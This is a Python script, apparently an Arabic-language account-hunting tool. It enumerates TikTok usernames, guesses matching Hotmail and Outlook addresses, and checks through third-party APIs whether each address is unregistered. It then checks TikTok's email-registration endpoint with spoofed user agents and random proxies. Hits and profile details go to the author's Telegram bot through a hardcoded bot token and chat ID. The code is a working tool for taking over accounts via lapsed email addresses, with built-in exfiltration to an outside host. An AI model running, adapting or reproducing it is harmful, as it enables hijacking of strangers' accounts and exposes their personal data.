import os
import random
import threading
import requests
from user_agent import generate_user_agent
bb = 0
gg = 0
GM = 0
BM = 0
# الألوان
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'


print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} maho_s9    |
|{F}[+] Instagram  : {B}ahmedalharrani |
|{F}[+] Tool  : {B}متاحات TikTok |
{E}==============================''')
print(X + ' ═════════════════════════════════  ')
token=('6820247819:AAGny305ma4G0DZvtXTHv-yTClXQxuIvl_E')
ID = ('1413282475')
requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم تشغيل البوت')

def tlg(email):
    user = email.split('@')[0]
    req = requests.get(f'https://api-tiktok-7353d8bd3fcf.herokuapp.com/tiktok={user}')
    if '"status":"ok"' in req.text and "AHMED" in req.text:
        data = req.json()
        id = data.get('id')
        name = data.get('name')
        bio = data.get('bio')
        followers = data.get('followers')
        following = data.get('following')
        likes = data.get('like')
        videos = data.get('video')
        country = data.get('country')
        flag = data.get('flag')
        date = data.get('Date')
        private = data.get('private')
        secuid = data.get('secuid')
        username = data.get('username')
        kls = f"""───────────────\n⎌ Email ➢ {email} \n⎌ ᴜѕᴇʀɴᴀᴍᴇ ➢ {username} \n⎌ ѕᴇᴄᴜɪᴅ ➢ {secuid} \n⎌ ɴᴀᴍᴇ ➢ {name}\n⎌ ғᴏʟʟᴏᴡᴇʀѕ ➢ {followers} \n⎌ ғᴏʟʟᴏᴡɪɴɢ ➢ {following}\n⎌ ʟɪᴋᴇѕ ➢ {likes}\n⎌ ᴠɪᴅᴇᴏѕ ➢ {videos}\n⎌ ᴘʀɪᴠᴀᴛᴇ ➢ {private}\n⎌ ᴄᴏᴜɴᴛʀʏ ➢ {country} {flag}\n⎌ ᴄʀᴇᴀᴛᴇᴅ ᴅᴀᴛᴇ ➢ {date}\n⎌ ɪᴅ ➢ {id}\n⎌ ʙɪᴏ ➢ {bio}\n─────────────── BY ➢ @maho_s9 - CH ➢ @maho9s"""
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={kls}')
    else:
        error_message = f'''
        صاد لك حساب بدون ما اعطا معلومات
        Email >> {email}
        User >> {user}
        BY : @maho9s | @maho_s9
        '''        
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={error_message}')
        
def mahos(email):
    global gg, bb
    try:
        proxy_list = []
        for _ in range(50):
            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
            port = random.choice(pl)
            mazen = ip + ":" + str(port)
            proxy_list.append(mazen)
        
        proxy = random.choice(proxy_list)
        url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
        data = f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA"
        hed = {
            "User-Agent": generate_user_agent(),
        }
        r = requests.post(url, headers=hed, data=data, proxies={'http://': proxy}).text
        if '"data":{"is_registered":1},"message":"success"' in r:
            gg += 1
            tlg(email)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @maho_s9 | @maho9s | TikTok HIT        
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [2] {Z} {Z}BAD IG - مش متاح   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [3] {A} {A}Good GM - جيميل صح » 「{GM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [4] {X} {X}BAD - ايميل خاطئ   » 「{BM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [5] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')
        else:
            bb += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @maho_s9 | @maho9s | TikTok HIT        
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [2] {Z} {Z}BAD IG - مش متاح   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [3] {A} {A}Good GM - جيميل صح » 「{GM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [4] {X} {X}BAD - ايميل خاطئ   » 「{BM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [5] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')
    except:
        bb += 1
        pass
        
        
        

def CheckEmail(email):
    global GM, BM
    req = requests.get(f"https://api-domin-bbc92d0bdbd3.herokuapp.com/hotmail={email}").text
    if '"Is_Available":"true",' in req and 'AHMED' in req:
        GM +=1
        mahos(email)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @maho_s9 | @maho9s | TikTok HIT        
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [2] {Z} {Z}BAD IG - مش متاح   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [3] {A} {A}Good GM - جيميل صح » 「{GM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [4] {X} {X}BAD - ايميل خاطئ   » 「{BM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [5] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')
    
           
    else:
        BM += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @maho_s9 | @maho9s | TikTok HIT        
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [2] {Z} {Z}BAD IG - مش متاح   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [3] {A} {A}Good GM - جيميل صح » 「{GM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [4] {X} {X}BAD - ايميل خاطئ   » 「{BM}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [5] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')
        
        

        
def gen():
    while True:
        user = 'qwertyuiopasdfghjklzxcvbnm.'
        num = '456789'
        rng = int("".join(random.choice(num) for i in range(1)))
        users = ''.join(random.choice(user) for i in range(rng))
        try:
            req = requests.get(f"https://api-search-tiktok-efd9cfb02c97.herokuapp.com/searchtiktok={users}").json()
            np = 0
            try:
                while True:
                    name = req['Users'][np]
                    np += 1
                    domin = random.choice(["@outlook.com", "@hotmail.com"])
                    email = name + domin
                    CheckEmail(email)
            except:
                pass
        except Exception as e:
            print(e)
            pass

threads = []
for _ in range(2):
    t = threading.Thread(target=gen)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()
